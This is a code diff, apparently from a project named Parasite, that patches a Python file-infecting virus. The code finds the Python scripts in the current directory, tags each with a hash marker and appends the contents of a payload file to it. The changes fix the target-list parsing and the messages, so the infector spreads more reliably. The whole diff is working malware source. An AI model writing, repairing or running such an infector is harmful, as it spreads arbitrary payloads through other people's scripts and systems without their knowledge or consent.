@@ -19,7 +19,7 @@ class IdentifyTarget:
             required_statement = 'if __name__ == "__main__":'
             if required_statement in FileOperations.read(self.file): 
                 return True
-            print("Could not verify file is python script; no {required_statement} statement.")
+            print(f"Could not verify file {self.file} is python script; no {required_statement} statement.")
             return False
         except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.")
     
@@ -27,7 +27,7 @@ class IdentifyTarget:
         id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d"
         try:
             if id in FileOperations.read(self.file):
-                print("File is already infected.")
+                print(f"File {self.file} is already infected.")
                 return True    
             return False
         except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.")
@@ -70,8 +70,7 @@ class Parasite:
         verified = IdentifyTarget(file).is_verified()
         if not verified: return 1
         print(f"Injecting {file}...\n")
-        FileOperations.append_to(file, f"\n# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d\n")
-        FileOperations.append_to(file, FileOperations.read(self.payload_file))  
+        FileOperations.append_to(file, f"\n# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d\n{FileOperations.read(self.payload_file)}")
         return 0
 
     def inject_all(self):
@@ -82,11 +81,14 @@ class Parasite:
         
         '''
         self.getPyFiles()
-
-        cwd_targets = FileOperations.read(self.output_path).split("\n").pop()
+        cwd_targets = FileOperations.read(self.output_path).split("\n")
+        cwd_targets.pop()   # Remove empty string at end of list
         print(cwd_targets)
         
         for py_file in cwd_targets:
+            print(py_file)
             if py_file != "Parasite.py":
-                self.inject(py_file)
-                print(f"{py_file} infected.")
+                injection_status = self.inject(py_file)
+                if injection_status == 0: 
+                    print(f"{py_file} infected.")
+    
